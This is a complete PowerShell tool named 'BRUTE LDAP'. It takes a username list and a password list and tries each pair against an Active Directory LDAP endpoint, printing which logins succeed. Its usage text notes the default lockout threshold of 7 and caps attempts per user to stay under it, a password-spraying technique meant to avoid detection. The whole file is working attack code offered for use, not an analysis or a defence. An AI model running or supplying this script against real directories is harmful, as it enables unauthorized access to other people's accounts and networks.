param($U,$P,$L,$C=5)

Write-Host $C
$banner =  "###################################################`n"
$banner += "###         ***hybase@outlook.hu****            ###`n"
$banner += "###                 BRUTE LDAP                  ###`n"
$banner += "###       Check connect LDAP with user and      ###`n"
$banner += "###                  password                   ###`n"
$banner += "###################################################`n"



if (($U -eq $null) -or ($P -eq $null) -or ($L -eq $null)) {
    Write-Host $banner
    Write-Host "Usage: BruteLDAP.exe -U 'c:\users\userlist.txt' -P 'c:\users\passlist.txt' -L 'LDAP://domain.local'" -ForegroundColor Yellow
    write-host "`n[REQUIRED SETTINGS]`n" -ForegroundColor Gray
    Write-Host "-U`tUserlist: username list file"
    Write-Host "-P`tPasswordList: password list file (default max $C probe per user)" 
    Write-Host "-L`tLDAPRootPath: Domain LDAP link ('LDAP://domain.local')"
    write-host "`n[OPTIONAL SETTINGS]`n" -ForegroundColor Gray
    Write-Host "-C Password number probe per user (default is $C)"
    write-host "   Warning, default ActiveDirectory bad password lockout settings is 7"
    Write-Host "____________________________________________________________________"
    Read-Host "I am finish"
    return
}



try{
    $UserList = Get-Content -Path $U -ErrorAction Stop 
    $PassWordList = Get-Content -Path $P -ErrorAction Stop
}
catch{
    Write-Host "[-]" -ForegroundColor Red -NoNewline
    Write-Host " "$_.exception.message
    Write-Host "____________________________________________________________________"
    Read-Host "I am finish"
    return
}



function Check-LDAP {
    param($UserName,$UserPassword)


    try{
        $Domain = New-Object -TypeName System.DirectoryServices.DirectoryEntry -ArgumentList $L.ToUpper(),$UserName,$UserPassword

        $Searcher = New-Object -TypeName System.DirectoryServices.DirectorySearcher
        $Searcher.Filter = "(objectCategory=User)"
        $Searcher.SizeLimit = '1'
        $Searcher.SearchRoot = $Domain
        $Searcher.FindOne() | Out-Null

        Write-Host "[+]" -ForegroundColor Green -NoNewline
        Write-Host " SUCCESS connected $UserName - $UserPassword"
    }
    catch {
        Write-Host "[-]" -ForegroundColor Red -NoNewline
        Write-Host " Not connected $UserName - $UserPassword"
        
    }
}




Write-Host $banner
Write-Host "[+] Trying brute force LDAP connectivity $L..." -ForegroundColor Yellow
Write-Host "____________________________________________________________________"
Write-Host ""
foreach ($user in $UserList) {
    for($i = 0; ($i -lt $PassWordList.Length) -and ($i -lt $C) ;$i++) {
        Check-LDAP -UserName $user -UserPassword $PassWordList[$i]
    }

}

Write-Host "____________________________________________________________________"
Read-Host "I am finish"
